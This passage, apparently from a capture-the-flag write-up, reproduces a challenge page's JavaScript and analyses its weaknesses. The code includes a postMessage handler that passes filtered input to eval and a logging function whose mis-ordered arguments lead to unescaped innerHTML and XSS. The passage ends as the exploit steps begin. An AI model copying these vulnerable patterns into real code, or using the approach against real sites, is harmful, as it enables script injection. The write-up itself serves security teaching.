+        <span class="token keyword">let</span> log <span class="token operator">=</span> <span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> data<span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'info'</span><span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">let</span> line <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">let</span> prefix_tag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">let</span> text_tag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">case</span> <span class="token string">'info'</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+                    line<span class="token punctuation">.</span>style<span class="token punctuation">.</span>backgroundColor <span class="token operator">=</span> <span class="token string">'lightcyan'</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">case</span> <span class="token string">'success'</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+                    line<span class="token punctuation">.</span>style<span class="token punctuation">.</span>backgroundColor <span class="token operator">=</span> <span class="token string">'lightgreen'</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">case</span> <span class="token string">'warn'</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+                    line<span class="token punctuation">.</span>style<span class="token punctuation">.</span>backgroundColor <span class="token operator">=</span> <span class="token string">'lightyellow'</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">case</span> <span class="token string">'err'</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+                    line<span class="token punctuation">.</span>style<span class="token punctuation">.</span>backgroundColor <span class="token operator">=</span> <span class="token string">'lightpink'</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span> 
+                <span class="token keyword">default</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+                    line<span class="token punctuation">.</span>style<span class="token punctuation">.</span>backgroundColor <span class="token operator">=</span> <span class="token string">'lightcyan'</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+            
+            data <span class="token operator">=</span> <span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>safe<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                data <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+            prefix_tag<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> prefix<span class="token punctuation">;</span>
+            text_tag<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> data<span class="token punctuation">;</span>
+
+            line<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>prefix_tag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            line<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>text_tag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#console'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> 
+
+        <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Connection status: '</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>onLine<span class="token operator">?</span><span class="token string">"Online"</span><span class="token operator">:</span><span class="token string">"Offline"</span><span class="token punctuation">)</span>
+        <span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">switch</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">case</span> <span class="token string">"log"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                    <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[log]: "</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message<span class="token punctuation">.</span>text<span class="token punctuation">,</span> type<span class="token operator">=</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">case</span> <span class="token string">"anchor"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                    <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[anchor]: "</span><span class="token punctuation">,</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token function">u</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'info'</span><span class="token punctuation">)</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">case</span> <span class="token string">"clear"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#console'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">default</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                    <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[???]: "</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Wrong command received: "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>cmd<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>c4936ad76292ee7100ecb9d72054e71f<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>top<span class="token punctuation">.</span><span class="token constant">DEV</span><span class="token punctuation">)</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Production build!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                
+            <span class="token keyword">let</span> <span class="token function-variable function">checkCredentials</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
+                    <span class="token keyword">let</span> users <span class="token operator">=</span> top<span class="token punctuation">.</span>store<span class="token punctuation">.</span>users<span class="token punctuation">;</span>
+                    <span class="token keyword">let</span> access <span class="token operator">=</span> <span class="token punctuation">[</span>users<span class="token punctuation">.</span>admin<span class="token punctuation">,</span> users<span class="token punctuation">.</span>moderator<span class="token punctuation">,</span> users<span class="token punctuation">.</span>manager<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>users <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+                    <span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token keyword">of</span> access<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>username <span class="token operator">===</span> username <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">)</span>
+                            <span class="token keyword">return</span> <span class="token boolean">true</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">return</span> <span class="token boolean">false</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">return</span> <span class="token boolean">false</span>
+            <span class="token punctuation">&#125;</span>
+
+            <span class="token keyword">let</span> _onmessage <span class="token operator">=</span> onmessage<span class="token punctuation">;</span>
+            <span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">let</span> m <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>m<span class="token punctuation">.</span>credentials <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">checkCredentials</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>username<span class="token punctuation">,</span> m<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// do nothing if unauthorized</span>
+                <span class="token punctuation">&#125;</span>
+            
+                <span class="token keyword">switch</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    <span class="token keyword">case</span> <span class="token string">"ping"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">// check the connection</span>
+                        e<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">message</span><span class="token operator">:</span><span class="token string">'pong'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+                    <span class="token keyword">case</span> <span class="token string">"logv"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">// display variable's value by its name</span>
+                        <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[logv]: "</span><span class="token punctuation">,</span> window<span class="token punctuation">[</span>m<span class="token punctuation">.</span>message<span class="token punctuation">]</span><span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+                    <span class="token keyword">case</span> <span class="token string">"compare"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">// compare variable's value to a given one</span>
+                        <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[compare]: "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>window<span class="token punctuation">[</span>m<span class="token punctuation">.</span>message<span class="token punctuation">.</span>variable<span class="token punctuation">]</span> <span class="token operator">===</span> m<span class="token punctuation">.</span>message<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+                    <span class="token keyword">case</span> <span class="token string">"reassign"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">// change variable's value</span>
+                        <span class="token keyword">let</span> o <span class="token operator">=</span> m<span class="token punctuation">.</span>message<span class="token punctuation">;</span>
+                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                            <span class="token keyword">let</span> RegExp <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[s-zA-Z-+0-9]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
+                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RegExp<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>RegExp<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Invalid input given!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">&#125;</span>
+                            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>a<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>b<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[reassign]: "</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Value of "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>a<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" was changed to "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>b<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'warn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                            <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[reassign]: "</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Error changing value (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>err<span class="token punctuation">.</span>message<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'err'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+                    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                        <span class="token function">_onmessage</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// keep default functions</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>
+            <span class="token comment">// hide this script on production</span>
+            document<span class="token punctuation">.</span>currentScript<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./analytics/main.js?t=1627610836<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>This page has a lot more code than the other two pages, and we can find some things we need, such as <code>eval</code>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> _onmessage <span class="token operator">=</span> onmessage<span class="token punctuation">;</span>
+<span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> m <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>m<span class="token punctuation">.</span>credentials <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">checkCredentials</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>username<span class="token punctuation">,</span> m<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// do nothing if unauthorized</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">switch</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token comment">// ...</span>
+        <span class="token keyword">case</span> <span class="token string">"reassign"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">// change variable's value</span>
+            <span class="token keyword">let</span> o <span class="token operator">=</span> m<span class="token punctuation">.</span>message<span class="token punctuation">;</span>
+            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">let</span> RegExp <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[s-zA-Z-+0-9]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RegExp<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>RegExp<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Invalid input given!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>a<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>b<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[reassign]: "</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Value of "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>a<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" was changed to "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>b<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'warn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[reassign]: "</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Error changing value (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>err<span class="token punctuation">.</span>message<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'err'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">default</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">_onmessage</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// keep default functions</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>But this <code>eval</code> seems unable to execute the code we want directly because the rules are quite strict (uppercase letters, some lowercase letters, numbers, and + -), so it may have other uses.</p>
+<p>Another possible place is here:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> log <span class="token operator">=</span> <span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> data<span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'info'</span><span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> line <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> prefix_tag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> text_tag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token comment">// not important</span>
+    <span class="token punctuation">&#125;</span>
+    
+    data <span class="token operator">=</span> <span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>safe<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        data <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    prefix_tag<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> prefix<span class="token punctuation">;</span>
+    text_tag<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> data<span class="token punctuation">;</span>
+
+    line<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>prefix_tag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    line<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>text_tag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#console'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>If safe is true, data will not be escaped, and any HTML can be inserted to achieve XSS.</p>
+<p>It’s worth noting the function’s parameter section: <code>let log = (prefix, data, type=&#39;info&#39;, safe=false)</code>, which deserves special explanation.</p>
+<p>In some programming languages, named parameters are supported, and when calling a function, parameters can be passed by name, such as <code>log(prefix=&#39;a&#39;, safe=true)</code>, which passes the corresponding parameters.</p>
+<p>However, there is no such thing in JS, and the correspondence of parameters is entirely determined by “order.” For example, <code>log(&quot;[logv]: &quot;, window[m.message], safe=false, type=&#39;info&#39;);</code> corresponds to the following parameters:</p>
+<ol>
+<li>prefix: <code>&quot;[logv]: &quot;</code></li>
+<li>data: <code>window[m.message]</code></li>
+<li>type: <code>false</code></li>
+<li>safe: <code>&#39;info&#39;</code></li>
+</ol>
+<p>It is based on the order rather than the name, which is also a common confusion for many beginners.</p>
+<p>Anyway, let’s start from the <code>log</code> function and work our way back. To execute this section, we need to post a message to this window and meet some conditions.</p>
+<h2><span id="level-1-successfully-post-a-message">Level 1: Successfully post a message</span></h2><p>There are some conditions on this console.php page. If these conditions are not met, we cannot execute the log function.</p>
+<p>First, this page must be embedded in an iframe:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">name <span class="token operator">=</span> <span class="token string">'Console'</span>
+document<span class="token punctuation">.</span>title <span class="token operator">=</span> name<span class="token punctuation">;</span>
